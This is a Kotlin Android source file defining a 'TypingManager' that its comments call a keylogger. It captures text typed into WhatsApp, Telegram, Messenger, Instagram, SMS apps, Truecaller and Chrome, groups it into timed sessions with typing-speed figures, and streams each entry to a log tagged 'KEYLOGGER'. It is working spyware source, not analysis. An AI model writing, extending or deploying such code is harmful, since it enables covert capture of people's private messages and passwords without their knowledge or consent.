package com.example.myandroid

import kotlinx.coroutines.*

import android.content.Context
import org.json.JSONArray
import org.json.JSONObject

object TypingManager {
    // EXPANDED TARGET LIST (Keylogger + Screen Reader Sync)
    private val TARGETS = setOf(
        "com.imo.android.imoim", 
        "com.google.android.apps.messaging", 
        "com.samsung.android.messaging",
        "com.whatsapp",
        "org.telegram.messenger",
        "org.telegram.plus",
        "com.truecaller",
        "com.android.chrome",
        "com.facebook.orca",
        "com.instagram.android"
    )

    private var lastPkg = ""
    private var lastTs = 0L
    private var startTs = 0L
    
    fun onType(ctx: Context, pkg: String, text: String) {
        // Feature Gate
        if (!ConfigManager.canCollect(ctx, "typing")) return

        if (pkg !in TARGETS) return
        if (text.isBlank()) return
        
        val now = System.currentTimeMillis()
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        
        // Load History
        val historyStr = prefs.getString("typing_history", "[]")
        val history = try { JSONArray(historyStr) } catch(e: Exception) { JSONArray() }
        
        // SESSION LOGIC: 
        // If same app AND less than 3 seconds gap, update the existing entry (it's the same sentence).
        // Otherwise, create a new entry.
        
        val isContinuation = (pkg == lastPkg && (now - lastTs) < 3000)
        
        val entry: JSONObject
        if (isContinuation && history.length() > 0) {
            // Update last entry
            entry = history.getJSONObject(history.length() - 1)
            entry.put("txt", text)
            entry.put("end_ts", now)
            
            // Recalculate WPM for this burst
            val burstDurationSec = (now - startTs) / 1000f
            if (burstDurationSec > 1) {
                // Standard: 5 chars = 1 word
                val wpm = (text.length / 5f) / (burstDurationSec / 60f)
                entry.put("wpm", wpm.toInt())
            }
            
            history.put(history.length() - 1, entry)
        } else {
            // New Entry
            startTs = now
            entry = JSONObject()
            entry.put("pkg", pkg)
            entry.put("txt", text)
            entry.put("start_ts", now)
            entry.put("end_ts", now)
            entry.put("wpm", 0)
            history.put(entry)
        }

        // LOGGING (STREAM)
        DumpManager.appendLog("KEY", entry)
        DumpManager.logVerification("KEYLOGGER", pkg)
        
        lastPkg = pkg
        lastTs = now
    }

    fun getStats(ctx: Context): JSONObject {
        val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val raw = prefs.getString("typing_history", "[]")
        val history = try { JSONArray(raw) } catch(e: Exception) { JSONArray() }
        
        var totalChars = 0
        var totalWpm = 0
        var validCount = 0
        
        for (i in 0 until history.length()) {
            val item = history.getJSONObject(i)
            totalChars += item.optString("txt").length
            val wpm = item.optInt("wpm")
            if (wpm > 0 && wpm < 200) {
                totalWpm += wpm
                validCount++
            }
        }
        
        val avg = if (validCount > 0) totalWpm / validCount else 0
        
        val stats = JSONObject()
        stats.put("total_chars", totalChars)
        stats.put("avg_wpm", avg)
        return stats
    }
}